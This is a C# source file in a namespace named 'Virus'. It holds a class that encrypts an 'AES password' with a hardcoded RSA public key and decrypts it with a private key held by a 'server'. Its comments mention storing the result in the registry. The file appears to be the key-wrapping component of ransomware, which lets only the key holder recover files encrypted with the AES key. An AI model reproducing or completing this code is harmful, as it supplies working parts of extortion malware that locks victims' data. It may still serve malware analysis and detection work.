using System;
using System.Security.Cryptography;
using System.Text;

namespace Virus
{
    class RSAencryption
    {
        private static readonly string _publicKey = "<RSAKeyValue><Modulus>sL6H9+sJ+ZeQLZX1b5d107lRFHrS0jWdXs9M2En/IilG9xTWHJstuPt13aq9QgDB/2tdi7SYLIIfqD5trNgViEK3/+45g71KQ1NZaiUaVVTweFINBkBqBlycCpPeQi0QljK1cLNunSWHF9zuU//RkUMC3jR4RIw1BR1Zo2qu/lFC9ektctXpGePZk2BEQ8xHg0oTgFF5MH8se8eM85Jc1rsHuxAwiTcjQ5ekBH14rgDtZiXTwDclAMXWM1sz9H2o7yRuBhdpaN4YL0tvGyEAuMcPulDA2QF7OhjIOG7q02VBQVGGXYxk9WukJ10Zg0/O17oEcal2nkLoA5lslUVXuQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";

        /// <summary>
        /// This function encrypts the char[] AESpassword
        /// </summary>
        /// <param name="passwordToEncrypt"></param>
        /// <returns></returns>
        public static string Encrypt(char[] passwordToEncrypt)
        {
            var bytesToEncrypt = Encoding.UTF8.GetBytes(passwordToEncrypt);
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    rsa.FromXmlString(_publicKey.ToString());
                    var encryptedData = rsa.Encrypt(bytesToEncrypt, true);
                    var base64Encrypted = Convert.ToBase64String(encryptedData);
                    return base64Encrypted;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }
        /// <summary>
        /// This function decrypts the string of the encrypted char[] AESpassword that is stored in regestry
        /// </summary>
        /// <param name="textToDecrypt"></param>
        /// <param name="privateKeyString"></param>
        /// <returns></returns>
        public static char[] Decrypt(string textToDecrypt, string privateKeyString)
        {
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    // server decrypting data with private key
                    rsa.FromXmlString(privateKeyString);

                    var bytesToDecrypt = Convert.FromBase64String(textToDecrypt);
                    var decryptedBytes = rsa.Decrypt(bytesToDecrypt, true);
                    var decryptedData = Encoding.UTF8.GetChars(decryptedBytes);
                    return decryptedData;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }

    }
}
